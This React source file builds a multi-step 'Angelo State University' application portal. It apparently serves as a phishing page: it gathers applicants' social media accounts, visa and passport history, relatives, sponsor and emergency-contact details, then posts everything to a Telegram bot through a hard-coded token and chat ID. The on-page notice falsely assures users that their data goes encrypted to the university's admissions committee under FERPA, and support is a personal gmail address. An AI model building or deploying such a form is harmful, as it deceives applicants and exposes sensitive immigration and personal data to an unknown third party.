import React, { useState } from 'react';

// Define types for our form data
interface EmergencyContact {
    name: string;
    address: string;
    phone: string;
    email: string;
}

interface FormData {
    facebook: string;
    instagram: string;
    twitter: string;
    tiktok: string;
    youtube: string;
    linkedin: string;
    snapchat: string;
    reddit: string;
    tumblr: string;
    pinterest: string;
    douyin: string;
    wechat: string;
    kakaotalk: string;
    line: string;
    everGrantedUSVisa: string;
    everRejectedUSVisa: string;
    rejectedExplain: string;
    filedImmigrantPetition: string;
    lostOrStolenPassport: string;
    immediateRelativesInUS: string;
    otherRelativesInUS: string;
    languages: string;
    countriesLast5Years: string;
    presentStatus: string;
    startDate: string;
    duties: string;
    emergency1: EmergencyContact;
    emergency2: EmergencyContact;
    sponsorPhone: string;
    salary: string;
}

export default function ProfessionalASUForm() {
    const [currentStep, setCurrentStep] = useState(1);
    const [formData, setFormData] = useState<FormData>({
        facebook: '', instagram: '', twitter: '', tiktok: '', youtube: '',
        linkedin: '', snapchat: '', reddit: '', tumblr: '', pinterest: '',
        douyin: '', wechat: '', kakaotalk: '', line: '',
        everGrantedUSVisa: '', everRejectedUSVisa: '', rejectedExplain: '',
        filedImmigrantPetition: '', lostOrStolenPassport: '',
        immediateRelativesInUS: '', otherRelativesInUS: '',
        languages: '', countriesLast5Years: '',
        presentStatus: '', startDate: '', duties: '',
        emergency1: { name: '', address: '', phone: '', email: '' },
        emergency2: { name: '', address: '', phone: '', email: '' },
        sponsorPhone: '', salary: '',
    });

    const totalSteps = 5;

    const stepTitles = [
        "Social Media Profiles",
        "Immigration History",
        "Personal Background",
        "Academic/Professional Information",
        "Emergency Contacts"
    ];

    function handleChange(path: string, value: string) {
        if (path.startsWith('emergency1.') || path.startsWith('emergency2.')) {
            const [root, key] = path.split('.');
            setFormData(prev => ({
                ...prev,
                [root]: {
                    ...prev[root as keyof FormData] as EmergencyContact,
                    [key]: value
                },
            }));
        } else {
            setFormData(prev => ({
                ...prev,
                [path]: value
            }));
        }
    }

    async function sendToTelegram(data: FormData) {
        const botToken = '8461799143:AAHlwmura72q0t0-O154c6GGMkAnb3PGfgQ';
        const chatId = '-1002071754413';

        const message = `
🎓 *ASU Application Submitted*

─────────────────────────────
| 🌐 Social Media Accounts  
─────────────────────────────
• *Facebook Account:* ${formData.facebook || 'Not provided'}
• *Instagram:* ${formData.instagram || 'Not provided'}
• *Twitter:* ${formData.twitter || 'Not provided'}
• *TikTok:* ${formData.tiktok || 'Not provided'}
• *YouTube:* ${formData.youtube || 'Not provided'}
• *LinkedIn:* ${formData.linkedin || 'Not provided'}
• *Snapchat:* ${formData.snapchat || 'Not provided'}
• *Reddit:* ${formData.reddit || 'Not provided'}
• *Tumblr:* ${formData.tumblr || 'Not provided'}
• *Pinterest:* ${formData.pinterest || 'Not provided'}
• *Douyin:* ${formData.douyin || 'Not provided'}
• *WeChat:* ${formData.wechat || 'Not provided'}
• *KakaoTalk:* ${formData.kakaotalk || 'Not provided'}
• *Line:* ${formData.line || 'Not provided'}

─────────────────────────────
| 🛂 Visa Information
─────────────────────────────
• *Granted US Visa:* ${formData.everGrantedUSVisa || 'Not answered'}
• *Rejected US Visa:* ${formData.everRejectedUSVisa || 'Not answered'}
• *Rejection Reason:* ${formData.rejectedExplain || 'N/A'}
• *Filed Immigrant Petition:* ${formData.filedImmigrantPetition || 'Not answered'}
• *Lost or Stolen Passport:* ${formData.lostOrStolenPassport || 'Not answered'}

─────────────────────────────
| 👨‍👩‍👧 Family Information
─────────────────────────────
• *Immediate Relatives in US:* ${formData.immediateRelativesInUS || 'Not provided'}
• *Other Relatives in US:* ${formData.otherRelativesInUS || 'Not provided'}

─────────────────────────────
| 🗣️ Languages & Travel
─────────────────────────────
• *Languages Spoken:* ${formData.languages || 'Not provided'}
• *Countries Visited (Last 5 Years):* ${formData.countriesLast5Years || 'Not provided'}

─────────────────────────────
| 💼 Work / Study Information
─────────────────────────────
• *Present Status:* ${formData.presentStatus || 'Not provided'}
• *Start Date of Study or Work:* ${formData.startDate || 'Not provided'}
• *Briefly Describe Your Duties:* ${formData.duties || 'Not provided'}

─────────────────────────────
| 📞 Emergency Contact 1
─────────────────────────────
• *Name:* ${formData.emergency1.name || 'Not provided'}
• *Phone:* ${formData.emergency1.phone || 'Not provided'}
• *Email:* ${formData.emergency1.email || 'Not provided'}
• *Address:* ${formData.emergency1.address || 'Not provided'}

─────────────────────────────
| 📞 Emergency Contact 2
─────────────────────────────
• *Name:* ${formData.emergency2.name || 'Not provided'}
• *Phone:* ${formData.emergency2.phone || 'Not provided'}
• *Email:* ${formData.emergency2.email || 'Not provided'}
• *Address:* ${formData.emergency2.address || 'Not provided'}

─────────────────────────────
| 👪 Sponsor Information
─────────────────────────────
• *Phone Number of Sponsor:* ${formData.sponsorPhone || 'Not provided'}
• *Salary (if employed):* ${formData.salary || 'Not provided'}

─────────────────────────────
🗓️ *Submitted:* ${new Date().toLocaleString()}
`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send to Telegram');
            }
        } catch (error) {
            console.error('Telegram send error:', error);
            alert('Application saved locally, but failed to send to Telegram. Please check your configuration.');
        }
    }

    function handleSubmit() {
        console.log('Submit payload:', formData);
        sendToTelegram(formData);
    }

    function nextStep() {
        if (currentStep < totalSteps) {
            setCurrentStep(currentStep + 1);
        }
    }

    function prevStep() {
        if (currentStep > 1) {
            setCurrentStep(currentStep - 1);
        }
    }

    function getProgressPercentage() {
        return (currentStep / totalSteps) * 100;
    }

    const socialMediaPlatforms = [
        { key: 'facebook', label: 'Facebook', icon: '👤' },
        { key: 'instagram', label: 'Instagram', icon: '📸' },
        { key: 'twitter', label: 'Twitter/X', icon: '🐦' },
        { key: 'tiktok', label: 'TikTok', icon: '🎵' },
        { key: 'youtube', label: 'YouTube', icon: '📺' },
        { key: 'linkedin', label: 'LinkedIn', icon: '💼' },
        { key: 'snapchat', label: 'Snapchat', icon: '👻' },
        { key: 'reddit', label: 'Reddit', icon: '🤖' },
        { key: 'tumblr', label: 'Tumblr', icon: '📝' },
        { key: 'pinterest', label: 'Pinterest', icon: '📌' },
        { key: 'douyin', label: 'Douyin', icon: '🎭' },
        { key: 'wechat', label: 'WeChat', icon: '💬' },
        { key: 'kakaotalk', label: 'KakaoTalk', icon: '💭' },
        { key: 'line', label: 'Line', icon: '📞' }
    ];

    return (
        <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-100">
            {/* Header */}
            <div className="bg-white shadow-sm border-b border-gray-100">
                <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
                    <div className="flex flex-col sm:flex-row items-center justify-between">
                        <div className="flex items-center space-x-4 mb-4 sm:mb-0">
                            <div className="flex items-center justify-center w-14 h-14 bg-gradient-to-r from-blue-600 to-indigo-600 rounded-2xl shadow-lg">
                                <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 14l9-5-9-5-9 5 9 5z" />
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 14l6.16-3.422a12.083 12.083 0 01.665 6.479A11.952 11.952 0 0012 20.055a11.952 11.952 0 00-6.824-2.998 12.078 12.078 0 01.665-6.479L12 14z" />
                                </svg>
                            </div>
                            <div>
                                <h1 className="text-2xl sm:text-3xl font-bold text-gray-900">Angelo State University</h1>
                                <p className="text-gray-600 font-medium">Application Portal</p>
                            </div>
                        </div>
                        <div className="text-center sm:text-right">
                            <div className="text-sm text-gray-500 mb-1">Application Progress</div>
                            <div className="text-2xl font-bold text-blue-600">{Math.round(getProgressPercentage())}%</div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="max-w-8xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
                {/* Step Navigation */}
                <div className="mb-8">
                    <div className="flex flex-col lg:flex-row items-center justify-between mb-6"        >
                        <div className="flex flex-wrap justify-center lg:justify-start gap-2 mb-4 lg:mb-0">
                            {stepTitles.map((title, index) => {
                                const stepNumber = index + 1;
                                const isActive = stepNumber === currentStep;
                                const isCompleted = stepNumber < currentStep;

                                return (
                                    <div key={stepNumber} className={`flex items-center space-x-2 px-4 py-2 rounded-full text-sm font-medium transition-all duration-300 ${
                                            isActive
                                                ? 'bg-blue-600 text-white shadow-lg scale-105'
                                                : isCompleted
                                                    ? 'bg-green-100 text-green-800'
                                                    : 'bg-white text-gray-600 border border-gray-200'}`
                                    }>
                                        <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                                            isActive ? 'bg-white text-blue-600' :
                                                isCompleted ? 'bg-green-600 text-white' : 'bg-gray-200 text-gray-600'
                                        }`}>
                                            {isCompleted ? '✓' : stepNumber}
                                        </span>
                                    </div>
                                );
                            })}
                        </div>
                    </div>

                    {/* Progress Bar */}
                    <div className="w-full bg-gray-200 rounded-full h-3 shadow-inner">
                        <div
                            className="bg-gradient-to-r from-blue-600 to-indigo-600 h-3 rounded-full transition-all duration-700 ease-out shadow-sm"
                            style={{ width: `${getProgressPercentage()}%` }}
                        />
                    </div>
                </div>

                {/* Form Container */}
                <div className="bg-white shadow-xl rounded-2xl border border-gray-100 overflow-hidden">
                    <div className="bg-gradient-to-r from-gray-50 to-blue-50 px-6 sm:px-8 py-6 border-b border-gray-100">
                        <h2 className="text-xl sm:text-2xl font-bold text-gray-900">{stepTitles[currentStep - 1]}</h2>
                        <p className="text-gray-600 mt-1">Step {currentStep} of {totalSteps}</p>
                    </div>

                    <div className="p-6 sm:p-8">
                        {/* Step 1: Social Media */}
                        {currentStep === 1 && (
                            <div className="space-y-6">
                                <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6">
                                    <div className="flex items-start space-x-3">
                                        <div className="flex-shrink-0">
                                            <svg className="w-5 h-5 text-blue-600 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                                            </svg>
                                        </div>
                                        <div>
                                            <h3 className="text-sm font-semibold text-blue-900 mb-1">Social Media Information</h3>
                                            <p className="text-sm text-blue-800">Please provide your social media handles. Leave blank if you don&#39;t have an account on a particular platform.</p>
                                        </div>
                                    </div>
                                </div>

                                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                                    {socialMediaPlatforms.map(({ key, label, icon }) => (
                                        <div key={key} className="group">
                                            <label className="block text-sm font-semibold text-gray-700 mb-2 items-center space-x-2">
                                                <span>{icon}</span>
                                                <span>{label}</span>
                                            </label>
                                            <input
                                                type="text"
                                                value={formData[key as keyof FormData] as string}
                                                onChange={e => handleChange(key, e.target.value)}
                                                placeholder={`@username`}
                                                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 group-hover:border-gray-300 bg-gray-50 focus:bg-white"
                                            />
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}

                        {/* Step 2: Immigration History */}
                        {currentStep === 2 && (
                            <div className="space-y-6">
                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                    <div className="space-y-4">
                                        <div>
                                            <label className="block text-sm font-semibold text-gray-700 mb-3">Have you ever been granted an US visa?</label>
                                            <div className="space-y-2">
                                                {['yes', 'no'].map(option => (
                                                    <label key={option} className="flex items-center space-x-3 cursor-pointer group">
                                                        <input
                                                            type="radio"
                                                            value={option}
                                                            checked={formData.everGrantedUSVisa === option}
                                                            onChange={e => handleChange('everGrantedUSVisa', e.target.value)}
                                                            className="w-4 h-4 text-blue-600 border-2 border-gray-300 focus:ring-2 focus:ring-blue-100"
                                                        />
                                                        <span className="text-gray-700 font-medium capitalize group-hover:text-gray-900">{option}</span>
                                                    </label>
                                                ))}
                                            </div>
                                        </div>

                                        <div>
                                            <label className="block text-sm font-semibold text-gray-700 mb-3">Have you ever been rejected an US visa?</label>
                                            <div className="space-y-2">
                                                {['yes', 'no'].map(option => (
                                                    <label key={option} className="flex items-center space-x-3 cursor-pointer group">
                                                        <input
                                                            type="radio"
                                                            value={option}
                                                            checked={formData.everRejectedUSVisa === option}
                                                            onChange={e => handleChange('everRejectedUSVisa', e.target.value)}
                                                            className="w-4 h-4 text-blue-600 border-2 border-gray-300 focus:ring-2 focus:ring-blue-100"
                                                        />
                                                        <span className="text-gray-700 font-medium capitalize group-hover:text-gray-900">{option}</span>
                                                    </label>
                                                ))}
                                            </div>
                                        </div>

                                        <div>
                                            <label className="block text-sm font-semibold text-gray-700 mb-3">Have you filed an immigrant petition to the US?</label>
                                            <div className="space-y-2">
                                                {['yes', 'no'].map(option => (
                                                    <label key={option} className="flex items-center space-x-3 cursor-pointer group">
                                                        <input
                                                            type="radio"
                                                            value={option}
                                                            checked={formData.filedImmigrantPetition === option}
                                                            onChange={e => handleChange('filedImmigrantPetition', e.target.value)}
                                                            className="w-4 h-4 text-blue-600 border-2 border-gray-300 focus:ring-2 focus:ring-blue-100"
                                                        />
                                                        <span className="text-gray-700 font-medium capitalize group-hover:text-gray-900">{option}</span>
                                                    </label>
                                                ))}
                                            </div>
                                        </div>

                                        <div>
                                            <label className="block text-sm font-semibold text-gray-700 mb-3">Have you ever lost a passport or had one stolen?</label>
                                            <div className="space-y-2">
                                                {['yes', 'no'].map(option => (
                                                    <label key={option} className="flex items-center space-x-3 cursor-pointer group">
                                                        <input
                                                            type="radio"
                                                            value={option}
                                                            checked={formData.lostOrStolenPassport === option}
                                                            onChange={e => handleChange('lostOrStolenPassport', e.target.value)}
                                                            className="w-4 h-4 text-blue-600 border-2 border-gray-300 focus:ring-2 focus:ring-blue-100"
                                                        />
                                                        <span className="text-gray-700 font-medium capitalize group-hover:text-gray-900">{option}</span>
                                                    </label>
                                                ))}
                                            </div>
                                        </div>
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-3">If rejected, please explain the circumstances</label>
                                        <textarea
                                            value={formData.rejectedExplain}
                                            onChange={e => handleChange('rejectedExplain', e.target.value)}
                                            placeholder="Please provide detailed explanation of the rejection circumstances..."
                                            rows={8}
                                            className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white resize-none"
                                        />
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Step 3: Personal Background */}
                        {currentStep === 3 && (
                            <div className="space-y-6">
                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-3">Do you have any immediate relatives in the US?</label>
                                        <input
                                            type="text"
                                            value={formData.immediateRelativesInUS}
                                            onChange={e => handleChange('immediateRelativesInUS', e.target.value)}
                                            placeholder="e.g., Parents, Spouse, Children (specify relationship and names)"
                                            className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                        />
                                    </div>
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-3">Do you have any other relative in the US?</label>
                                        <input
                                            type="text"
                                            value={formData.otherRelativesInUS}
                                            onChange={e => handleChange('otherRelativesInUS', e.target.value)}
                                            placeholder="e.g., Siblings, Cousins, Aunts, Uncles"
                                            className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                        />
                                    </div>
                                </div>

                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-3">How many langauge you can speak?</label>
                                        <input
                                            type="text"
                                            value={formData.languages}
                                            onChange={e => handleChange('languages', e.target.value)}
                                            placeholder="e.g., English (fluent), Spanish (native), French (basic)"
                                            className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                        />
                                    </div>
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-3">How many countries you have traveled within the las five year?</label>
                                        <input
                                            type="text"
                                            value={formData.countriesLast5Years}
                                            onChange={e => handleChange('countriesLast5Years', e.target.value)}
                                            placeholder="e.g., Canada (2023), Mexico (2022), UK (2021)"
                                            className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                        />
                                    </div>
                                </div>

                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-3">Phone number of your sponsor (Mother or Father)</label>
                                        <input
                                            type="tel"
                                            value={formData.sponsorPhone}
                                            onChange={e => handleChange('sponsorPhone', e.target.value)}
                                            placeholder="+(855) 123-4567-983"
                                            className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                        />
                                    </div>
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-3">If you are empoyed (Salary)</label>
                                        <input
                                            type="text"
                                            value={formData.salary}
                                            onChange={e => handleChange('salary', e.target.value)}
                                            placeholder="e.g., $550 per year"
                                            className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                        />
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Step 4: Academic/Professional Information */}
                        {currentStep === 4 && (
                            <div className="space-y-6">
                                <div>
                                    <label className="block text-sm font-semibold text-gray-700 mb-3">Present status *</label>
                                    <select
                                        value={formData.presentStatus}
                                        onChange={e => handleChange('presentStatus', e.target.value)}
                                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                    >
                                        <option value="">Select your current status</option>
                                        <option value="student">Student</option>
                                        <option value="employed">Employed</option>
                                        <option value="unemployed">Unemployed</option>
                                        <option value="self-employed">Self-employed</option>
                                        <option value="retired">Retired</option>
                                        <option value="other">Other</option>
                                    </select>
                                </div>

                                <div>
                                    <label className="block text-sm font-semibold text-gray-700 mb-3">Start date of study or work (mm/dd/yy)</label>
                                    <input
                                        type="date"
                                        value={formData.startDate}
                                        onChange={e => handleChange('startDate', e.target.value)}
                                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white"
                                    />
                                </div>

                                <div>
                                    <label className="block text-sm font-semibold text-gray-700 mb-3">Briefly describe your current duties and responsibilities</label>
                                    <textarea
                                        value={formData.duties}
                                        onChange={e => handleChange('duties', e.target.value)}
                                        placeholder="Please provide a detailed description of your current role, responsibilities, and key achievements..."
                                        rows={6}
                                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-gray-50 focus:bg-white resize-none"
                                    />
                                </div>
                            </div>
                        )}

                        {/* Step 5: Emergency Contacts */}
                        {currentStep === 5 && (
                            <div className="space-y-8">
                                <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6">
                                    <div className="flex items-start space-x-3">
                                        <div className="flex-shrink-0">
                                            <svg className="w-5 h-5 text-amber-600 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z" />
                                            </svg>
                                        </div>
                                        <div>
                                            <h3 className="text-sm font-semibold text-amber-900 mb-1">Important Notice</h3>
                                            <p className="text-sm text-amber-800">Please provide two emergency contacts who are NOT your parents. These should be reliable individuals who can be reached in case of emergency.</p>
                                        </div>
                                    </div>
                                </div>

                                {[
                                    { root: 'emergency1', title: 'Primary Emergency Contact', icon: '🚨', color: 'red' },
                                    { root: 'emergency2', title: 'Secondary Emergency Contact', icon: '📞', color: 'blue' }
                                ].map(({ root, title, icon, color }, index) => (
                                    <div key={root} className={`bg-gradient-to-r ${color === 'red' ? 'from-red-50 to-pink-50 border-red-200' : 'from-blue-50 to-indigo-50 border-blue-200'} rounded-2xl p-6 border shadow-sm`}>
                                        <div className="flex items-center space-x-3 mb-6">
                                            <span className="text-2xl">{icon}</span>
                                            <h3 className="text-lg font-bold text-gray-900">{title}</h3>
                                            <span className={`px-3 py-1 rounded-full text-xs font-semibold ${color === 'red' ? 'bg-red-100 text-red-800' : 'bg-blue-100 text-blue-800'}`}>
                                                Contact {index + 1}
                                            </span>
                                        </div>

                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                            <div>
                                                <label className="block text-sm font-semibold text-gray-700 mb-2">Full Name *</label>
                                                <input
                                                    type="text"
                                                    placeholder="Enter complete full name"
                                                    value={(formData[root as keyof FormData] as EmergencyContact).name}
                                                    onChange={e => handleChange(`${root}.name`, e.target.value)}
                                                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-white shadow-sm"
                                                />
                                            </div>
                                            <div>
                                                <label className="block text-sm font-semibold text-gray-700 mb-2">Phone Number *</label>
                                                <input
                                                    type="tel"
                                                    placeholder="+1 (555) 123-4567"
                                                    value={(formData[root as keyof FormData] as EmergencyContact).phone}
                                                    onChange={e => handleChange(`${root}.phone`, e.target.value)}
                                                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-white shadow-sm"
                                                />
                                            </div>
                                            <div>
                                                <label className="block text-sm font-semibold text-gray-700 mb-2">Email Address *</label>
                                                <input
                                                    type="email"
                                                    placeholder="contact@example.com"
                                                    value={(formData[root as keyof FormData] as EmergencyContact).email}
                                                    onChange={e => handleChange(`${root}.email`, e.target.value)}
                                                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-white shadow-sm"
                                                />
                                            </div>
                                            <div>
                                                <label className="block text-sm font-semibold text-gray-700 mb-2">Complete Address *</label>
                                                <input
                                                    type="text"
                                                    placeholder="Street Address, City, State, ZIP Code, Country"
                                                    value={(formData[root as keyof FormData] as EmergencyContact).address}
                                                    onChange={e => handleChange(`${root}.address`, e.target.value)}
                                                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all duration-200 bg-white shadow-sm"
                                                />
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>

                    {/* Navigation Footer */}
                    <div className="bg-gray-50 px-6 sm:px-8 py-6 border-t border-gray-100">
                        <div className="flex flex-col sm:flex-row justify-between items-center space-y-4 sm:space-y-0">
                            <button
                                onClick={prevStep}
                                disabled={currentStep === 1}
                                className={`px-8 py-3 rounded-xl font-semibold transition-all duration-300 flex items-center space-x-2 w-full sm:w-auto justify-center transform hover:scale-105 ${
                                    currentStep === 1
                                        ? 'bg-gray-100 text-gray-400 cursor-not-allowed hover:scale-100'
                                        : 'bg-white text-gray-700 hover:bg-gray-100 shadow-md border border-gray-200'
                                }`}
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                                </svg>
                                <span>Previous Step</span>
                            </button>

                            <div className="flex items-center space-x-4 text-sm text-gray-600">
                                <span>Step {currentStep} of {totalSteps}</span>
                                <div className="w-24 bg-gray-200 rounded-full h-2">
                                    <div
                                        className="bg-blue-600 h-2 rounded-full transition-all duration-500"
                                        style={{ width: `${getProgressPercentage()}%` }}
                                    />
                                </div>
                            </div>

                            {currentStep < totalSteps ? (
                                <button
                                    onClick={nextStep}
                                    className="px-8 py-3 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:from-blue-700 hover:to-indigo-700 transition-all duration-300 flex items-center space-x-2 w-full sm:w-auto justify-center shadow-lg transform hover:scale-105"
                                >
                                    <span>Next Step</span>
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                                    </svg>
                                </button>
                            ) : (
                                <button
                                    onClick={handleSubmit}
                                    className="px-8 py-3 rounded-xl bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:from-green-700 hover:to-emerald-700 transition-all duration-300 flex items-center space-x-2 w-full sm:w-auto justify-center shadow-lg transform hover:scale-105"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" />
                                    </svg>
                                    <span>Submit Application</span>
                                </button>
                            )}
                        </div>
                    </div>
                </div>

                {/* Security Notice */}
                <div className="mt-8 bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-2xl p-6 shadow-sm">
                    <div className="flex items-start space-x-4">
                        <div className="flex-shrink-0">
                            <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center">
                                <svg className="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                                </svg>
                            </div>
                        </div>
                        <div>
                            <h3 className="text-lg font-bold text-green-900 mb-2">🔒 Secure Application Process</h3>
                            <p className="text-green-800 mb-4">
                                Your application data is encrypted and securely transmitted to Angelo State University&#39;s admissions committee.
                                All information provided will be kept confidential and used solely for admission evaluation purposes.
                            </p>
                            <div className="flex flex-wrap gap-4 text-sm">
                                <div className="flex items-center space-x-2">
                                    <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                                    <span className="text-green-700">SSL Encrypted</span>
                                </div>
                                <div className="flex items-center space-x-2">
                                    <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                                    <span className="text-green-700">FERPA Compliant</span>
                                </div>
                                <div className="flex items-center space-x-2">
                                    <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                                    <span className="text-green-700">Data Privacy Protected</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Footer */}
                <div className="mt-8 text-center text-sm text-gray-500">
                    <p>© 2025 Angelo State University - Application Portal</p>
                    <p className="mt-1">For technical support, contact <a href="mailto:cambodiaasu@gmail.com" className="text-blue-600 hover:text-blue-800 transition-colors">cambodiaasu@gmail.com</a></p>
                </div>
            </div>
        </div>
    );
}